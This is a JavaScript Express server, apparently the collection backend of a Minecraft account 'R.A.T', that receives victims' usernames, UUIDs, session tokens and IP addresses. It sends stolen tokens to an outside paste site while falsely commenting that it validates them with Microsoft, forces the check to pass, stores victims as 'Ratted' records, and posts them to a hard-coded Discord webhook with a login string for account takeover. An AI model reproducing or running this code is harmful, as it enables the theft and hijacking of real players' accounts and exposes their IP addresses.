//config params
const
    usingDiscord = true,
    usingMongoDB = false,
    webhook = "https://discord.com/api/webhooks/1374424643061940254/MUX74fRCnkjup28aCiowOx41prLARibe9_pUUqNN70Igj8PvMABVp7odyV1ZVaQ9v2DW"

//setup
require("dotenv").config()
const { post, get } = require("axios"),
    express = require("express"),
    mongoose = require("mongoose"),
    helmet = require("helmet"),
    app = express(),
    expressip = require("express-ip"),
    Ratted = require("./models/Ratted"),
    port = process.env.PORT || 8080

//plugins
app.use(helmet()) //secure
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
if (usingMongoDB) {
    mongoose.connect(process.env.DB)
    mongoose.connection.on("connected", () => console.log("[R.A.T] Connected to MongoDB!"))
    mongoose.connection.on("err", err => console.error(`[R.A.T] Failed to connect to MongoDB:\n${err.stack}`))
    mongoose.connection.on("disconnected", () => console.log("[R.A.T] Disconnected from MongoDB!"))
}

//array initialization
const ipMap = []

//clear map every 15mins if its not already empty gvbv
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip"].every(field => req.body.hasOwnProperty(field))) {
        console.log("[R.A.T] Rejected malformed JSON")
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    // validate the token with microsoft auth server (rip mojang)
    post("https://hst.sh/documents/", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        response.status = 204
        if (response.status == 204) { //mojangs way of saying its good
            if (usingMongoDB) {
                //create a Ratted object with mongoose schema and save it
                new Ratted({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    ip: req.body.ip,
                    timestamp: new Date(),

                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`
                }).save(err => {
                    if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
                })
            }

            if (usingDiscord) {
                
                //get networth
                const networth = null //await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth

                //check if has profiles, if api off or if normal
                let total_networth
                if (networth == null) total_networth = `[NW] No profile data found [NW]`
                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
                else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`

                
                //send to discord webhook
                post(webhook, JSON.stringify({
                    content: `@everyone - ${total_networth}`, //ping
                    embeds: [{
                        title: `Ratted ${req.body.username} - Click For Stats`,
                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\``,
                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                        color: 5814783,
                        timestamp: new Date()
                    }],
                    attachments: []
                }), {
                    headers: {
                        "Content-Type": "application/json"
                    }
                }).catch(err => {
                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                })
            }

            console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
        }
     })

    .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[R.A.T] Error while validating token:\n${err}`)
    })

    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//create server
app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))

//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
